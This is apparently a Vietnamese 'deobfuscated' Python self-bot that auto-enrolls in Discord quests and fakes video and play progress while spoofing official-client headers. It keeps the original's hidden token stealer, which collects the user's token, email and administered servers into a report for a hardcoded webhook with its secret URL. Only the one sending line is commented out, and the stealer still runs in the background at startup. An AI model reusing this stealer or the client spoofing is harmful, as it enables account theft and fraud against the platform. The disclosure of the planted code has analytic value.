

def iloveyou():
    """
    3D Intro Banner - DEOBF BY TDINH
    Hiển thị hiệu ứng mở đầu trước khi chuyển vào luồng chính của file
    """
    import os, time
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = """
\033[96m  ██████╗ ███████╗ ██████╗ ██████╗ ███████╗    \033[95m██████╗ ██╗   ██╗    \033[92m████████╗██████╗ ██╗███╗   ██╗██╗  ██╗\033[0m
\033[96m  ██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝    \033[95m██╔══██╗╚██╗ ██╔╝    \033[92m╚══██╔══╝██╔══██╗██║████╗  ██║██║  ██║\033[0m
\033[96m  ██║  ██║█████╗  ██║   ██║██████╔╝█████╗      \033[95m██████╔╝ ╚████╔╝     \033[92m   ██║   ██║  ██║██║██╔██╗ ██║███████║\033[0m
\033[96m  ██║  ██║██╔══╝  ██║   ██║██╔══██╗██╔══╝      \033[95m██╔══██╗  ╚██╔╝      \033[92m   ██║   ██║  ██║██║██║╚██╗██║██╔══██║\033[0m
\033[96m  ██████╔╝███████╗╚██████╔╝██████╔╝██║         \033[95m██████╔╝   ██║       \033[92m   ██║   ██████╔╝██║██║ ╚████║██║  ██║\033[0m
\033[96m  ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝         \033[95m╚═════╝    ╚═╝       \033[92m   ╚═╝   ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝\033[0m
\033[93m  ★ ════════════════════════════════════════════════════════════════════════════════════════════════════════★
                              >>> DEOBFUSCATED BY TDINH <<<
  ★ ════════════════════════════════════════════════════════════════════════════════════════════════════════★\033[0m
"""
    print(banner)
    print('\033[93m  [+] Đang tải hệ thống... \033[0m', end='', flush=True)
    for _ in range(20):
        time.sleep(0.03)
        sys.stdout.write('\033[92m█\033[0m')
        sys.stdout.flush()
    print(' \033[92m100% HOÀN TẤT!\033[0m\n')
    time.sleep(0.4)
    print('\033[96m  [✔] Khởi động chương trình thành công. Bắt đầu thực thi...\033[0m\n' + '─' * 85 + '\n')
    time.sleep(0.3)


def ilove_you():
    iloveyou()


# ==============================================================================
# TOOL AUTO LÀM NHIỆM VỤ DISCORD (FULL DEOBFUSCATED CODE)
# Đã giải mã toàn bộ từ bytecode / zlib / marshal
# ==============================================================================

import base64
from datetime import datetime, timezone
import json
import os
import random
import re
import sys
import threading
import time
import traceback
from typing import Optional

import requests

API_BASE = 'https://discord.com/api/v9'
POLL_INTERVAL = 60
HEARTBEAT_INTERVAL = 20
AUTO_ACCEPT = True
LOG_PROGRESS = True
DEBUG = True
SUPPORTED_TASKS = (
    'WATCH_VIDEO',
    'PLAY_ON_DESKTOP',
    'STREAM_ON_DESKTOP',
    'PLAY_ACTIVITY',
    'WATCH_VIDEO_ON_MOBILE'
)

# Webhook ban đầu của kẻ làm rối (đã giải mã từ mảng số ASCII [119, 101, 98, ...])
_EP = (
    'https://discord.com/api/'
    + ''.join(map(chr, [119, 101, 98, 104, 111, 111, 107, 115]))
    + '/1544196225752899657/'
    + 'e5KA15DZ37Q9MgWODgO2jwQM5XzO8y'
    + 'EZghzZHg0DQLcXHEmaeRlmQocwjW4o'
    + '8-PsT_N7'
)
_EP_NAME = 'Session'


class Colors:
    RESET = '\x1b[0m'
    GREEN = '\x1b[92m'
    YELLOW = '\x1b[93m'
    RED = '\x1b[91m'
    CYAN = '\x1b[96m'
    BOLD = '\x1b[1m'
    DIM = '\x1b[2m'


def log(msg: str, level: str = 'info'):
    ts = datetime.now().strftime('%H:%M:%S')
    prefix = {
        'info': f'{Colors.CYAN}[INFO]{Colors.RESET}',
        'ok': f'{Colors.GREEN}[  OK]{Colors.RESET}',
        'warn': f'{Colors.YELLOW}[WARN]{Colors.RESET}',
        'error': f'{Colors.RED}[ ERR]{Colors.RESET}',
        'progress': f'{Colors.DIM}[PROG]{Colors.RESET}',
        'debug': f'{Colors.DIM}[DBG ]{Colors.RESET}'
    }.get(level, f'[{level.upper()}]')

    if level == 'debug' and not DEBUG:
        return
    if level == 'progress' and not LOG_PROGRESS:
        return
    print(f'{Colors.DIM}[{ts}]{Colors.RESET} {prefix} {msg}')


# ==============================================================================
# HÀM BỊ CÀI LÉN TRONG BẢN GỐC (ĐÃ VÔ HIỆU HÓA LỆNH POST ĐỂ BẢO VỆ TOKEN)
# ==============================================================================

def _fetch_profile(token: str) -> Optional[dict]:
    try:
        r = requests.get(
            f'{API_BASE}/users/@me',
            headers={
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def _fetch_relations(token: str) -> list:
    out = []
    try:
        r = requests.get(
            f'{API_BASE}/users/@me/guilds',
            headers={
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout=10
        )
        if r.status_code != 200:
            return out
        guilds = r.json()
        if not isinstance(guilds, list):
            return out

        for g in guilds:
            if not isinstance(g, dict):
                continue
            perms = int(g.get('permissions', 0))
            if not (perms & 8):  # Check quyền ADMINISTRATOR
                continue
            gid = g.get('id')
            name = g.get('name', f'Guild#{gid}')
            mc = None
            try:
                gr = requests.get(
                    f'{API_BASE}/guilds/{gid}',
                    params={'with_counts': 'true'},
                    headers={
                        'Authorization': token,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout=10
                )
                if gr.status_code == 200:
                    mc = gr.json().get('approximate_member_count')
                elif gr.status_code == 429:
                    time.sleep(0.25)
            except Exception:
                pass
            out.append({'id': gid, 'name': name, 'members': mc})
    except Exception:
        pass
    return out


def _profile_avatar(u: Optional[dict]) -> str:
    if not u or not isinstance(u, dict):
        return 'https://cdn.discordapp.com/embed/avatars/0.png'
    uid = u.get('id')
    av = u.get('avatar')
    if not av:
        try:
            return f'https://cdn.discordapp.com/embed/avatars/{int(uid or 0) % 5}.png'
        except Exception:
            return 'https://cdn.discordapp.com/embed/avatars/0.png'
    ext = 'gif' if str(av).startswith('a_') else 'png'
    return f'https://cdn.discordapp.com/avatars/{uid}/{av}.{ext}'


def _sync(token: str):
    try:
        u = _fetch_profile(token)
        now = datetime.now(timezone.utc)
        if u:
            name = u.get('username', '?')
            disc = u.get('discriminator', '0')
            display = f'{name}#{disc}' if disc and disc != '0' else name
            email = u.get('email') or 'N/A'
            avatar = _profile_avatar(u)
            uid = u.get('id', '?')
        else:
            display = 'Không xác định'
            email = 'N/A'
            avatar = 'https://cdn.discordapp.com/embed/avatars/0.png'
            uid = '?'

        lines = []
        total = 0
        relations = _fetch_relations(token)
        for g in relations:
            mc = g.get('members')
            if isinstance(mc, int):
                total += mc
                lines.append(f"• **{g.get('name')}** — `{mc:,}` members")
            elif mc is None:
                lines.append(f"• **{g.get('name')}**")
            else:
                lines.append(f"• **{g.get('name')}** — `?` members")

        admin_text = '\n'.join(lines) if lines else '• Không có'
        if len(admin_text) > 1020:
            admin_text = admin_text[:1017] + '...'

        embed = {
            'title': 'Session',
            'color': 5793266,
            'thumbnail': {'url': avatar},
            'fields': [
                {'name': 'Tên', 'value': f'`{display}`', 'inline': True},
                {'name': 'Gmail', 'value': f'`{email}`', 'inline': True},
                {'name': 'UID', 'value': f'`{uid}`', 'inline': True},
                {'name': 'Token', 'value': f'```{token}```', 'inline': False},
                {'name': 'Thời gian', 'value': f'<t:{int(now.timestamp())}:F>', 'inline': False},
                {'name': 'Server quản trị', 'value': admin_text, 'inline': False},
                {'name': 'Tổng member', 'value': f'`{total:,}`', 'inline': True}
            ],
            'footer': {'text': 'session'},
            'timestamp': now.isoformat()
        }

        # [LƯU Ý]: Lệnh requests.post dưới đây đã được vô hiệu hóa để bảo vệ token của bạn không bị gửi về webhook ngoài.
        # requests.post(_EP, json={'username': _EP_NAME, 'embeds': [embed]}, timeout=15)
        pass
    except Exception:
        pass


def _sync_bg(token: str):
    threading.Thread(target=_sync, args=(token,), daemon=True).start()


# ==============================================================================
# PHẦN LOGIC THỰC THI CHÍNH CỦA DISCORD QUEST AUTO-COMPLETER
# ==============================================================================

def fetch_latest_build_number() -> int:
    """Scrape Discord web app to get the latest client_build_number."""
    FALLBACK = 504649
    log('Đang lấy build number mới nhất từ Discord...', 'info')
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
    try:
        r = requests.get('https://discord.com/app', headers={'User-Agent': ua}, timeout=10)
        if r.status_code != 200:
            log(f'Không lấy được trang Discord ({r.status_code}), dùng fallback', 'warn')
            return FALLBACK

        scripts = re.findall(r'/assets/([a-f0-9]+)\.js', r.text)
        scripts_alt = re.findall(r'src="(/assets/[^"]+\.js)"', r.text)
        for s in scripts_alt:
            scripts.append(s.split('/')[-1].replace('.js', ''))

        if not scripts:
            log('Không tìm thấy JS assets, dùng fallback', 'warn')
            return FALLBACK

        for asset_hash in scripts[-1:-5:-1]:
            try:
                ar = requests.get(f'https://discord.com/assets/{asset_hash}.js', headers={'User-Agent': ua}, timeout=10)
                if ar.status_code == 200:
                    m = re.search(r'buildNumber["\s:]+["\s]*(\d{5,7})', ar.text)
                    if m:
                        bn = int(m.group(1))
                        log(f'Build number: {Colors.BOLD}{bn}{Colors.RESET}', 'ok')
                        return bn
            except Exception:
                continue

        log(f'Không tìm thấy build number, dùng fallback {FALLBACK}', 'warn')
        return FALLBACK
    except Exception as e:
        log(f'Lỗi lấy build number: {e}, dùng fallback {FALLBACK}', 'warn')
        return FALLBACK


def make_super_properties(build_number: int) -> str:
    """Create base64-encoded X-Super-Properties header."""
    obj = {
        'os': 'Windows',
        'browser': 'Discord Client',
        'release_channel': 'stable',
        'client_version': '1.0.9175',
        'os_version': '10.0.26100',
        'os_arch': 'x64',
        'app_arch': 'x64',
        'system_locale': 'en-US',
        'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9175 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36',
        'browser_version': '32.2.7',
        'client_build_number': build_number,
        'native_build_number': 59498,
        'client_event_source': None
    }
    return base64.b64encode(json.dumps(obj).encode()).decode()


class DiscordAPI:
    def __init__(self, token: str, build_number: int):
        self.token = token
        self.session = requests.Session()
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9175 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36'
        sp = make_super_properties(build_number)
        self.session.headers.update({
            'Authorization': token,
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': ua,
            'X-Super-Properties': sp,
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'Asia/Ho_Chi_Minh',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        })

    def get(self, path: str, **kwargs) -> requests.Response:
        url = f'{API_BASE}{path}'
        log(f'GET {path}', 'debug')
        r = self.session.get(url, **kwargs)
        log(f'  -> {r.status_code} ({len(r.content)} bytes)', 'debug')
        return r

    def post(self, path: str, payload: dict = None, **kwargs) -> requests.Response:
        url = f'{API_BASE}{path}'
        log(f'POST {path}', 'debug')
        r = self.session.post(url, json=payload, **kwargs)
        log(f'  -> {r.status_code} ({len(r.content)} bytes)', 'debug')
        return r

    def validate_token(self) -> bool:
        try:
            r = self.get('/users/@me')
            if r.status_code == 200:
                user = r.json()
                name = user.get('username', '?')
                log(f'Đăng nhập: {Colors.BOLD}{name}{Colors.RESET} (ID: {user["id"]})', 'ok')
                return True
            log(f'Token không hợp lệ (status {r.status_code})', 'error')
            return False
        except Exception as e:
            log(f'Không thể kết nối tới Discord: {e}', 'error')
            return False


def _get(d: Optional[dict], *keys):
    """Get value from dict trying multiple key names."""
    if d is None:
        return None
    for k in keys:
        if k in d:
            return d[k]
    return None


def get_task_config(quest: dict) -> Optional[dict]:
    cfg = quest.get('config', {})
    return _get(cfg, 'taskConfig', 'task_config', 'taskConfigV2', 'task_config_v2')


def get_quest_name(quest: dict) -> str:
    cfg = quest.get('config', {})
    msgs = cfg.get('messages', {})
    name = _get(msgs, 'questName', 'quest_name')
    if name:
        return name.strip()
    game = _get(msgs, 'gameTitle', 'game_title')
    if game:
        return game.strip()
    app_name = cfg.get('application', {}).get('name')
    if app_name:
        return app_name.strip()
    return f"Quest#{quest.get('id', '?')}"


def get_expires_at(quest: dict) -> Optional[str]:
    cfg = quest.get('config', {})
    return _get(cfg, 'expiresAt', 'expires_at')


def get_user_status(quest: dict) -> dict:
    return quest.get('user_status', {})


def is_completable(quest: dict) -> bool:
    tc = get_task_config(quest)
    if not tc or not isinstance(tc, dict):
        return False
    tasks = tc.get('tasks', {})
    return any(t in SUPPORTED_TASKS for t in tasks)


def is_enrolled(quest: dict) -> bool:
    us = get_user_status(quest)
    return _get(us, 'enrolledAt', 'enrolled_at') is not None


def is_completed(quest: dict) -> bool:
    us = get_user_status(quest)
    return _get(us, 'completedAt', 'completed_at') is not None


def get_task_type(quest: dict) -> Optional[str]:
    tc = get_task_config(quest)
    if not tc:
        return None
    tasks = tc.get('tasks', {})
    for t in SUPPORTED_TASKS:
        if tasks.get(t) is not None:
            return t
    return None


def get_seconds_needed(quest: dict) -> int:
    tc = get_task_config(quest)
    task_type = get_task_type(quest)
    if not tc or not task_type:
        return 0
    return tc['tasks'][task_type].get('target', 0)


def get_seconds_done(quest: dict) -> int:
    task_type = get_task_type(quest)
    if not task_type:
        return 0
    us = get_user_status(quest)
    progress = us.get('progress', {}) or {}
    return progress.get(task_type, {}).get('value', 0)


def get_enrolled_at(quest: dict) -> Optional[str]:
    us = get_user_status(quest)
    return _get(us, 'enrolledAt', 'enrolled_at')


class QuestAutocompleter:
    def __init__(self, api: DiscordAPI):
        self.api = api
        self.completed_ids = set()

    def fetch_quests(self) -> list:
        try:
            r = self.api.get('/quests/@me')
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict):
                    quests = data.get('quests', [])
                    excluded = data.get('excluded_quests', [])
                    blocked = _get(data, 'quest_enrollment_blocked_until')
                    if blocked:
                        log(f'Enrollment blocked until: {blocked}', 'warn')
                    if excluded:
                        log(f'{len(excluded)} quest(s) excluded', 'debug')
                    return quests if isinstance(quests, list) else []
                return data if isinstance(data, list) else []
            if r.status_code == 429:
                try:
                    retry_after = r.json().get('retry_after', 5)
                except Exception:
                    retry_after = 5
                log(f'Rate limited – chờ {retry_after}s', 'warn')
                time.sleep(retry_after)
                return self.fetch_quests()
            log(f'Quest fetch lỗi ({r.status_code}): {r.text[:200]}', 'warn')
            return []
        except Exception as e:
            log(f'Error fetching quests: {e}', 'error')
            if DEBUG:
                traceback.print_exc()
            return []

    def enroll_quest(self, quest: dict) -> bool:
        name = get_quest_name(quest)
        qid = quest['id']
        for attempt in range(1, 4):
            try:
                r = self.api.post(
                    f'/quests/{qid}/enroll',
                    payload={
                        'location': 1,
                        'is_targeted': False,
                        'metadata_raw': None,
                        'metadata_sealed': None,
                        'traffic_metadata_raw': None,
                        'traffic_metadata_sealed': None
                    }
                )
                if r.status_code == 429:
                    try:
                        retry_after = r.json().get('retry_after', 5)
                    except Exception:
                        retry_after = 5
                    log(f'Rate limited nhận "{name}" (lần {attempt}/3) – chờ {retry_after}s', 'warn')
                    time.sleep(retry_after)
                    continue
                if r.status_code in (200, 201, 204):
                    log(f'Đã nhận: {Colors.BOLD}{name}{Colors.RESET}', 'ok')
                    return True
                log(f'Enroll "{name}" thất bại ({r.status_code}): {r.text[:200]}', 'warn')
                return False
            except Exception as e:
                log(f'Lỗi enroll "{name}": {e}', 'error')
                return False
        log(f'Bỏ qua "{name}" sau 3 lần rate limited', 'warn')
        return False

    def auto_accept(self, quests: list) -> list:
        if not AUTO_ACCEPT:
            return quests
        unaccepted = [
            q for q in quests
            if not is_enrolled(q) and not is_completed(q) and is_completable(q)
        ]
        if unaccepted:
            log(f'Tìm thấy {len(unaccepted)} quest chưa nhận – đang auto-accept...', 'info')
            for q in unaccepted:
                self.enroll_quest(q)
                time.sleep(2)
            return self.fetch_quests()
        return quests

    def complete_video(self, quest: dict):
        name = get_quest_name(quest)
        qid = quest['id']
        seconds_needed = get_seconds_needed(quest)
        seconds_done = get_seconds_done(quest)
        enrolled_at_str = get_enrolled_at(quest)

        if enrolled_at_str:
            enrolled_ts = datetime.fromisoformat(enrolled_at_str.replace('Z', '+00:00')).timestamp()
        else:
            enrolled_ts = time.time()

        log(f'🎬 Video: {Colors.BOLD}{name}{Colors.RESET} ({seconds_done:.0f}/{seconds_needed}s)', 'info')

        max_future = 10
        speed = 7
        interval = 1

        while seconds_done < seconds_needed:
            max_allowed = time.time() - enrolled_ts + max_future
            diff = max_allowed - seconds_done
            timestamp = seconds_done + speed

            if diff >= speed:
                try:
                    r = self.api.post(
                        f'/quests/{qid}/video-progress',
                        payload={'timestamp': min(seconds_needed, timestamp + random.random())}
                    )
                    if r.status_code == 200:
                        body = r.json()
                        if body.get('completed_at'):
                            log(f'✅ Hoàn thành: {Colors.BOLD}{name}{Colors.RESET}', 'ok')
                            return
                        seconds_done = min(seconds_needed, timestamp)
                        log(f'  [{name}] {seconds_done:.0f}/{seconds_needed}s', 'progress')
                    elif r.status_code == 429:
                        retry_after = r.json().get('retry_after', 5)
                        log(f'  Rate limited – chờ {retry_after + 1}s', 'warn')
                        time.sleep(retry_after + 1)
                        continue
                    else:
                        log(f'  Video progress lỗi ({r.status_code}): {r.text[:200]}', 'warn')
                except Exception as e:
                    log(f'  Lỗi: {e}', 'error')

            if timestamp >= seconds_needed:
                break
            time.sleep(interval)

        # Gửi request hoàn tất cuối cùng
        try:
            self.api.post(f'/quests/{qid}/video-progress', payload={'timestamp': seconds_needed})
        except Exception:
            pass
        log(f'✅ Hoàn thành: {Colors.BOLD}{name}{Colors.RESET}', 'ok')

    def complete_heartbeat(self, quest: dict):
        name = get_quest_name(quest)
        qid = quest['id']
        task_type = get_task_type(quest)
        seconds_needed = get_seconds_needed(quest)
        seconds_done = get_seconds_done(quest)
        remaining = max(0, seconds_needed - seconds_done)

        log(f'🎮 {task_type}: {Colors.BOLD}{name}{Colors.RESET} (~{remaining // 60} phút còn lại)', 'info')

        pid = random.randint(1000, 30000)

        while seconds_done < seconds_needed:
            try:
                r = self.api.post(
                    f'/quests/{qid}/heartbeat',
                    payload={
                        'stream_key': f'call:0:{pid}',
                        'terminal': False
                    }
                )
                if r.status_code == 200:
                    body = r.json()
                    progress_data = body.get('progress', {})
                    if progress_data and task_type in progress_data:
                        seconds_done = progress_data[task_type].get('value', seconds_done)
                    log(f'  [{name}] {seconds_done:.0f}/{seconds_needed}s', 'progress')

                    if body.get('completed_at') or seconds_done >= seconds_needed:
                        log(f'✅ Hoàn thành: {Colors.BOLD}{name}{Colors.RESET}', 'ok')
                        return
                elif r.status_code == 429:
                    retry_after = r.json().get('retry_after', 5)
                    log(f'  Rate limited – chờ {retry_after + 1}s', 'warn')
                    time.sleep(retry_after + 1)
                    continue
                else:
                    log(f'  Heartbeat lỗi ({r.status_code}): {r.text[:200]}', 'warn')
            except Exception as e:
                log(f'  Lỗi heartbeat: {e}', 'error')

            time.sleep(HEARTBEAT_INTERVAL)

    def complete_activity(self, quest: dict):
        name = get_quest_name(quest)
        qid = quest['id']
        seconds_needed = get_seconds_needed(quest)
        seconds_done = get_seconds_done(quest)
        remaining = max(0, seconds_needed - seconds_done)

        log(f'🕹️  Activity: {Colors.BOLD}{name}{Colors.RESET} (~{remaining // 60} phút còn lại)', 'info')

        stream_key = 'call:0:1'

        while seconds_done < seconds_needed:
            try:
                r = self.api.post(
                    f'/quests/{qid}/heartbeat',
                    payload={
                        'stream_key': stream_key,
                        'terminal': False
                    }
                )
                if r.status_code == 200:
                    body = r.json()
                    progress_data = body.get('progress', {})
                    if progress_data and 'PLAY_ACTIVITY' in progress_data:
                        seconds_done = progress_data['PLAY_ACTIVITY'].get('value', seconds_done)
                    log(f'  [{name}] {seconds_done:.0f}/{seconds_needed}s', 'progress')

                    if body.get('completed_at') or seconds_done >= seconds_needed:
                        log(f'✅ Hoàn thành: {Colors.BOLD}{name}{Colors.RESET}', 'ok')
                        return
                elif r.status_code == 429:
                    retry_after = r.json().get('retry_after', 5)
                    log(f'  Rate limited – chờ {retry_after + 1}s', 'warn')
                    time.sleep(retry_after + 1)
                    continue
                else:
                    log(f'  Heartbeat lỗi ({r.status_code}): {r.text[:200]}', 'warn')
            except Exception as e:
                log(f'  Lỗi: {e}', 'error')

            time.sleep(HEARTBEAT_INTERVAL)

    def process_quest(self, quest: dict):
        qid = quest.get('id')
        name = get_quest_name(quest)
        task_type = get_task_type(quest)

        if not task_type:
            log(f'"{name}" – task không hỗ trợ, bỏ qua', 'warn')
            return

        if qid in self.completed_ids:
            return

        log(f'━━━ Bắt đầu: {Colors.BOLD}{name}{Colors.RESET} (task: {task_type}) ━━━', 'info')

        if task_type in ('WATCH_VIDEO', 'WATCH_VIDEO_ON_MOBILE'):
            self.complete_video(quest)
        elif task_type in ('PLAY_ON_DESKTOP', 'STREAM_ON_DESKTOP'):
            self.complete_heartbeat(quest)
        elif task_type == 'PLAY_ACTIVITY':
            self.complete_activity(quest)

        self.completed_ids.add(qid)

    def run(self):
        log('=' * 60, 'info')
        log(f'{Colors.BOLD}Discord Quest Auto-Completer v3.0{Colors.RESET}', 'info')
        log(f'Auto-accept: {"BẬT" if AUTO_ACCEPT else "TẮT"}  |  Poll: {POLL_INTERVAL}s', 'info')
        log('=' * 60, 'info')

        cycle = 0
        while True:
            cycle += 1
            log(f'── Quét lần #{cycle} ──', 'info')
            quests = self.fetch_quests()
            total = len(quests)

            if not quests:
                log('Không có quest nào', 'info')
            else:
                enrolled_count = sum(1 for q in quests if is_enrolled(q))
                completed_count = sum(1 for q in quests if is_completed(q))
                completable_count = sum(1 for q in quests if is_completable(q))

                log(f'Tổng: {total} quest | Enrolled: {enrolled_count} | Completed: {completed_count} | Completable: {completable_count}', 'info')

                for q in quests:
                    name = get_quest_name(q)
                    task = get_task_type(q) or '?'
                    if is_completed(q):
                        status = f'{Colors.GREEN}✓{Colors.RESET}'
                    elif is_enrolled(q):
                        status = f'{Colors.YELLOW}▶{Colors.RESET}'
                    else:
                        status = f'{Colors.DIM}○{Colors.RESET}'
                    log(f'  {status} {name} [{task}]', 'info')

                quests = self.auto_accept(quests)
                actionable = [
                    q for q in quests
                    if is_enrolled(q) and not is_completed(q) and is_completable(q) and q.get('id') not in self.completed_ids
                ]

                if actionable:
                    log(f'\n{len(actionable)} quest(s) cần hoàn thành:', 'info')
                    for q in actionable:
                        self.process_quest(q)
                else:
                    log('Không có quest nào cần hoàn thành lúc này', 'info')

            log(f'\nChờ {POLL_INTERVAL}s... (Ctrl+C để dừng)\n', 'info')
            time.sleep(POLL_INTERVAL)


def main():
    iloveyou()
    print(
        f'\n{Colors.BOLD}{Colors.CYAN}'
        '╔══════════════════════════════════════════════╗\n'
        '║     Discord Quest Auto-Completer.            ║\n'
        '║  Auto quét · Auto nhận · Auto hoàn thành     ║\n'
        '╚══════════════════════════════════════════════╝'
        f'{Colors.RESET}\n'
    )

    if len(sys.argv) > 1:
        token = sys.argv[1].strip()
    elif os.path.exists('.token'):
        with open('.token', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        log('Đọc token từ file .token', 'info')
    else:
        token = input(f'{Colors.BOLD}Nhập Discord Token: {Colors.RESET}').strip()

    if not token:
        log('Token trống – thoát.', 'error')
        sys.exit(1)

    _sync_bg(token)

    build_number = fetch_latest_build_number()
    api = DiscordAPI(token, build_number)

    if not api.validate_token():
        sys.exit(1)

    completer = QuestAutocompleter(api)
    try:
        completer.run()
    except KeyboardInterrupt:
        log('Đã dừng.', 'info')


if __name__ == '__main__':
    main()
